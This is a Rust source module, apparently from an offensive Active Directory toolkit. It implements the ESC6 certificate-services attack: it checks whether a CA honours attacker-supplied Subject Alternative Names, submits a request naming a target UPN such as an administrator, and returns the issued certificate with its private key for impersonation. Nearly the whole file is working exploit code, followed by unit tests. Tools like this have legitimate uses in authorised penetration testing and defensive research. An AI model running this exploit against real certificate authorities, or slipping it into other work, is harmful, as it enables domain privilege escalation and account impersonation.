//! ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Abuse
//!
//! When the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled,
//! **any** certificate template can have a Subject Alternative Name (SAN)
//! specified via request *attributes* — even if the template itself does
//! not allow the enrollee to supply the subject.
//!
//! Attack flow:
//! 1. (Optional) Check whether the CA is vulnerable via `check_vulnerable()`
//! 2. Create a standard CSR (no SAN in the extension)
//! 3. Submit the CSR with the target UPN in the `san:` request attribute
//! 4. If the CA honours it, the issued cert contains the attacker-chosen SAN
//!
//! Reference: SpecterOps "Certified Pre-Owned" — ESC6

use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::adcs::{IssuedCertificate, create_client_auth_csr};
use crate::error::{OverthroneError, Result};
use tracing::{info, warn};

/// ESC6 exploiter for EDITF_ATTRIBUTESUBJECTALTNAME2 abuse.
pub struct Esc6Exploiter {
    web_client: WebEnrollmentClient,
}

impl Esc6Exploiter {
    /// Create a new ESC6 exploiter targeting the given CA server.
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self { web_client })
    }

    /// Probe whether the CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled.
    ///
    /// Delegates to [`WebEnrollmentClient::check_esc6_vulnerable`] which sends
    /// a crafted request and inspects the response.
    pub async fn check_vulnerable(&self) -> Result<bool> {
        info!("ESC6: Checking if CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled");
        self.web_client.check_esc6_vulnerable().await
    }

    /// Execute ESC6 attack — submit a certificate request with the target UPN
    /// in the SAN request attribute.
    ///
    /// # Arguments
    /// * `template` - Any template with Client Authentication EKU
    /// * `target_upn` - UPN to impersonate (e.g. "administrator@corp.local")
    ///
    /// # Returns
    /// * `Ok(IssuedCertificate)` on success
    pub async fn exploit(&self, template: &str, target_upn: &str) -> Result<IssuedCertificate> {
        info!(
            "Executing ESC6 attack: template={}, target_upn={}",
            template, target_upn
        );

        // Create a standard CSR (no SAN in the extension — we put it in attributes)
        let (csr_der, private_key) = create_client_auth_csr("esc6-attack", template, None)?;

        // Submit with the SAN in request attributes (key differentiator of ESC6)
        let response = self
            .web_client
            .submit_request_with_san(&csr_der, template, target_upn)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 6,
                reason: format!("Certificate request denied: {}", response.message),
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in ESC6 response".to_string()))?;

        // Verify the SAN made it into the issued certificate
        if let Err(e) = Self::verify_san_in_response(&cert_data, target_upn) {
            warn!("ESC6 SAN verification warning (cert may still work): {}", e);
        }

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: Self::compute_thumbprint(&cert_data),
            serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: "CN=esc6-attack".to_string(),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: private_key,
        })
    }

    /// Verify the issued certificate actually contains the expected UPN in
    /// its Subject Alternative Name extension (OID 2.5.29.17).
    pub fn verify_san_in_response(cert_der: &[u8], expected_upn: &str) -> Result<()> {
        use x509_parser::parse_x509_certificate;

        let (_, cert) = parse_x509_certificate(cert_der).map_err(|e| {
            OverthroneError::Adcs(format!("Failed to parse cert for SAN check: {e}"))
        })?;

        let san_oid = x509_parser::oid_registry::OID_X509_EXT_SUBJECT_ALT_NAME;

        for ext in cert.tbs_certificate.extensions() {
            if ext.oid == san_oid {
                let raw_str = String::from_utf8_lossy(ext.value);
                if raw_str.contains(expected_upn) {
                    info!("ESC6: SAN contains target UPN '{expected_upn}'");
                    return Ok(());
                }
            }
        }

        Err(OverthroneError::EscAttack {
            esc_number: 6,
            reason: format!(
                "Issued certificate does not contain expected UPN '{}' in SAN",
                expected_upn
            ),
        })
    }

    fn compute_thumbprint(cert_der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let mut hasher = Sha1::new();
        hasher.update(cert_der);
        hex::encode(hasher.finalize()).to_uppercase()
    }

    fn extract_serial(cert_der: &[u8]) -> Result<String> {
        use x509_parser::parse_x509_certificate;
        match parse_x509_certificate(cert_der) {
            Ok((_, cert)) => {
                let serial = cert.tbs_certificate.serial.to_bytes_be();
                Ok(hex::encode(serial).to_uppercase())
            }
            Err(_) => Ok("Unknown".to_string()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    #[test]
    fn test_esc6_exploiter_creation() {
        let exploiter = Esc6Exploiter::new("ca.corp.local");
        assert!(exploiter.is_ok());
    }

    #[test]
    fn test_compute_thumbprint() {
        let cert_der = vec![0x30, 0x82, 0x01, 0x00];
        let thumbprint = Esc6Exploiter::compute_thumbprint(&cert_der);
        assert!(!thumbprint.is_empty());
        assert_eq!(thumbprint.len(), 40);
    }

    #[test]
    fn test_extract_serial_invalid_cert() {
        let cert_der = vec![0x30, 0x82, 0x01, 0x00];
        let serial = Esc6Exploiter::extract_serial(&cert_der);
        assert!(serial.is_ok());
    }

    proptest! {
        #[test]
        fn prop_thumbprint_deterministic(
            cert_data in prop::collection::vec(any::<u8>(), 1..1024)
        ) {
            let t1 = Esc6Exploiter::compute_thumbprint(&cert_data);
            let t2 = Esc6Exploiter::compute_thumbprint(&cert_data);
            prop_assert_eq!(&t1, &t2);
            prop_assert_eq!(t1.len(), 40);
        }
    }

    proptest! {
        #[test]
        fn prop_serial_extraction_no_panic(
            cert_data in prop::collection::vec(any::<u8>(), 1..1024)
        ) {
            let _ = Esc6Exploiter::extract_serial(&cert_data);
        }
    }
}
